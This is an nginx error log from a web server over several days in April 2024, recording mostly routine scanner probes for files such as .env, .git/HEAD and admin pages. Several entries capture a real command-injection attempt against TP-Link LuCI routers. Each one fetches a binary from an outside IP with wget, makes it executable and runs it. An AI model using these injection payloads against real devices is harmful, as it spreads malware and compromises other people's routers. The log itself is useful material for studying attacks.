2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 19:39:57 [error] 23#23: *536 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 19:44:38 [error] 23#23: *538 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.50, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 19:44:42 [error] 23#23: *539 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.50, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 19:45:01 [error] 23#23: *541 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.138, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 20:21:36 [error] 23#23: *542 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 20:22:07 [error] 23#23: *545 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.7, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/21 20:22:29 [error] 23#23: *547 open() "/usr/share/nginx/html/main.shtml" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /main.shtml HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:29 [error] 23#23: *546 open() "/usr/share/nginx/html/Portal0000.htm" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /Portal0000.htm HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:29 [error] 22#22: *548 open() "/usr/share/nginx/html/Portal/Portal.mwsl" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /Portal/Portal.mwsl HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:29 [error] 22#22: *549 open() "/usr/share/nginx/html/rjL4" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /rjL4 HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:29 [error] 22#22: *550 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:29 [error] 22#22: *551 "/usr/share/nginx/html/docs/cplugError.html/index.html" is not found (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /docs/cplugError.html/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *553 open() "/usr/share/nginx/html/__Additional" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /__Additional HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *552 open() "/usr/share/nginx/html/inicio.jsp" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /inicio.jsp HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *554 open() "/usr/share/nginx/html/nmaplowercheck1713730948" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /nmaplowercheck1713730948 HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *555 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *556 open() "/usr/share/nginx/html/inicio.pl" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /inicio.pl HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *557 open() "/usr/share/nginx/html/.git/HEAD" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /.git/HEAD HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *559 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 20:22:30 [error] 22#22: *558 open() "/usr/share/nginx/html/pools/default/buckets" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /pools/default/buckets HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:30 [error] 22#22: *560 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:31 [error] 22#22: *561 open() "/usr/share/nginx/html/menu.jsp" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /menu.jsp HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:31 [error] 22#22: *562 open() "/usr/share/nginx/html/pools" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /pools HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:31 [error] 22#22: *563 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:31 [error] 23#23: *564 open() "/usr/share/nginx/html/start.cgi" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /start.cgi HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:32 [error] 23#23: *565 open() "/usr/share/nginx/html/CSS/Miniweb.css" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /CSS/Miniweb.css HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:32 [error] 23#23: *567 open() "/usr/share/nginx/html/inicio.cgi" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /inicio.cgi HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:33 [error] 23#23: *568 open() "/usr/share/nginx/html/inicio.jhtml" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /inicio.jhtml HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:34 [error] 23#23: *569 open() "/usr/share/nginx/html/readme.txt" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /readme.txt HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:34 [error] 23#23: *570 open() "/usr/share/nginx/html/menu.shtml" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /menu.shtml HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:35 [error] 23#23: *571 open() "/usr/share/nginx/html/indice.cfm" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /indice.cfm HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:35 [error] 23#23: *573 open() "/usr/share/nginx/html/scripts/WPnBr.dll" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "POST /scripts/WPnBr.dll HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:36 [error] 23#23: *574 open() "/usr/share/nginx/html/home.html" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /home.html HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:36 [error] 23#23: *575 open() "/usr/share/nginx/html/default.jhtml" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /default.jhtml HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:37 [error] 23#23: *576 open() "/usr/share/nginx/html/indice.php" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /indice.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:37 [error] 23#23: *577 open() "/usr/share/nginx/html/indice.asp" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /indice.asp HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:38 [error] 23#23: *578 open() "/usr/share/nginx/html/inicio.aspx" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /inicio.aspx HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:38 [error] 22#22: *579 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "HEAD / HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:39 [error] 22#22: *580 open() "/usr/share/nginx/html/localstart.asp" failed (2: No such file or directory), client: 139.162.7.59, server: localhost, request: "GET /localstart.asp HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:22:39 [error] 22#22: *581 directory index of "/usr/share/nginx/html/" is forbidden, client: 139.162.7.59, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 20:32:37 [error] 22#22: *584 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.70, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 20:49:21 [error] 22#22: *585 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 21:54:16 [error] 22#22: *587 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 22:27:46 [error] 22#22: *588 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:40:30 [error] 22#22: *589 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 103.67.163.199, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:40:31 [error] 22#22: *589 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.67.163.199, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:31 [error] 22#22: *590 directory index of "/usr/share/nginx/html/" is forbidden, client: 147.182.225.86, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:31 [error] 22#22: *591 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 147.182.225.86, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:32 [error] 22#22: *592 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 147.182.225.86, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:33 [error] 22#22: *593 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 147.182.225.86, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:34 [error] 22#22: *594 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 147.182.225.86, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 22:54:47 [error] 23#23: *595 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.103, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 23:10:19 [error] 23#23: *596 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 23:16:05 [error] 23#23: *597 directory index of "/usr/share/nginx/html/" is forbidden, client: 59.183.41.228, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 23:32:57 [error] 23#23: *599 directory index of "/usr/share/nginx/html/" is forbidden, client: 106.14.47.169, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:32 [error] 23#23: *602 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.71.116.30, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:32 [error] 23#23: *603 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:33 [error] 23#23: *604 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:33 [error] 23#23: *606 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:34 [error] 23#23: *607 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:34 [error] 23#23: *608 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:34 [error] 23#23: *609 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:35 [error] 23#23: *610 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:35 [error] 22#22: *611 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:35 [error] 22#22: *612 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 23:35:36 [error] 22#22: *613 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 167.71.116.30, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/22 00:30:01 [error] 22#22: *615 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.210.88, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 00:46:28 [error] 22#22: *616 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.7, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 00:46:28 [error] 22#22: *617 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.7, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 00:46:28 [error] 22#22: *618 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.7, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 00:46:28 [error] 22#22: *619 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 00:46:37 [error] 22#22: *621 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.103.41.229, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 01:23:04 [error] 22#22: *622 directory index of "/usr/share/nginx/html/" is forbidden, client: 141.98.11.128, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 02:03:53 [error] 22#22: *625 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.5, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 03:19:14 [error] 22#22: *626 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/22 03:44:07 [error] 23#23: *630 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 04:08:10 [error] 23#23: *632 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.44, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 04:08:10 [error] 23#23: *633 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.44, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:08:10 [error] 23#23: *634 open() "/usr/share/nginx/html/nmaplowercheck1713758890" failed (2: No such file or directory), client: 104.152.52.44, server: localhost, request: "GET /nmaplowercheck1713758890 HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:08:10 [error] 23#23: *635 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.44, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 04:08:11 [error] 23#23: *636 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.44, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:08:11 [error] 23#23: *637 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.44, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:08:12 [error] 23#23: *638 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.44, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 04:08:12 [error] 23#23: *639 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.44, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:13:53 [error] 23#23: *640 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:54:38 [error] 22#22: *643 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:54:42 [error] 22#22: *643 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:54:45 [error] 22#22: *643 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:54:48 [error] 22#22: *644 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 04:54:52 [error] 22#22: *644 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 05:54:27 [error] 22#22: *646 directory index of "/usr/share/nginx/html/" is forbidden, client: 147.182.247.10, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 05:54:27 [error] 22#22: *647 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 147.182.247.10, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 05:54:28 [error] 22#22: *648 open() "/usr/share/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 147.182.247.10, server: localhost, request: "GET /sitemap.xml HTTP/1.1", host: "8.148.22.188"
2024/04/22 05:54:28 [error] 22#22: *649 open() "/usr/share/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 147.182.247.10, server: localhost, request: "GET /.well-known/security.txt HTTP/1.1", host: "8.148.22.188"
2024/04/22 05:54:29 [error] 22#22: *650 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 147.182.247.10, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/22 06:00:29 [error] 22#22: *651 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 06:12:40 [error] 22#22: *652 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.177, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/22 06:21:36 [error] 22#22: *654 directory index of "/usr/share/nginx/html/" is forbidden, client: 180.163.29.234, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 06:42:39 [error] 22#22: *655 open() "/usr/share/nginx/html/Kvsh/login/index_main.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "POST /Kvsh/login/index_main.php HTTP/1.1", host: "unique-li.club"
2024/04/22 06:58:42 [error] 22#22: *656 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 07:00:16 [error] 22#22: *657 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/22 07:09:33 [error] 23#23: *659 open() "/usr/share/nginx/html/Kvsh/c.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/c.php?server=1&type=1 HTTP/1.1", host: "unique-li.club"
2024/04/22 07:11:49 [error] 23#23: *660 directory index of "/usr/share/nginx/html/" is forbidden, client: 192.241.237.45, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 07:22:54 [error] 23#23: *661 directory index of "/usr/share/nginx/html/" is forbidden, client: 71.6.232.28, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 07:24:01 [error] 23#23: *662 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.30, server: localhost, request: "GET / HTTP/1.0"
2024/04/22 07:27:35 [error] 23#23: *663 directory index of "/usr/share/nginx/html/" is forbidden, client: 188.166.54.15, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 07:40:26 [error] 23#23: *664 open() "/usr/share/nginx/html/Kvsh/geti.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/geti.php HTTP/1.1", host: "unique-li.club"
2024/04/22 08:14:33 [error] 23#23: *665 directory index of "/usr/share/nginx/html/" is forbidden, client: 74.82.47.4, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/22 08:16:40 [error] 23#23: *666 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 74.82.47.4, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/22 08:18:55 [error] 23#23: *667 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 74.82.47.4, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
